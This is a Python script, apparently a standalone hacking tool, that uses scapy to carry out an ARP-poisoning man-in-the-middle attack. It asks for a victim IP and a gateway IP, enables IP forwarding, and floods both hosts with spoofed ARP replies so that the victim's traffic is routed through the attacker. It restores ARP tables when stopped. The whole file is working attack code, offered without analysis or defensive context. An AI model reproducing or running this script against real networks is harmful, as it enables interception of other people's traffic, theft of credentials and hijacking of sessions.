from scapy.all import *
import sys
import os
import time


interface = input("[*] Enter Desired Interface: ")
victimIP = input("[*] Enter Victim IP: ")
gateIP = input("[*] Enter Router IP: ")

# Port Forwarding requires superuser privs
try:
    print("\n[*] Enabling IP Forwarding...\n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
except Exception:
    # if not super user
    print("failed to enable port forwarding... Are you root user?")
    exit()


def get_mac(IP):
    # use scapy to get MAC address
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def reARP():  # reset ARP and disable port forwarding
    print("\n[*] Restoring Targets...")
    victimMAC = get_mac(victimIP)
    gateMAC = get_mac(gateIP)
    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
    send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateMAC), count=7)
    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Shutting Down...")
    sys.exit(1)


def trick(gm, vm):  # replace the gateway IP with our IP
    send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst=vm))
    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst=gm))


def mitm():  # run the man in the middle attack
    try:
        victimMAC = get_mac(victimIP)
    except Exception:  # When an exception is found, remember to undo ip forwarding
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldn't Find Victim MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    try:
        gateMAC = get_mac(gateIP)
    except Exception:  # When an exception is found, remember to undo ip forwarding
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] Couldn't Find Gateway MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    print("[*] Poisoning Targets...")
    while 1:
        try:
            trick(gateMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:  # remember to reset ARP when done with poisoning (press Ctrl-C)
            reARP()
            break


mitm()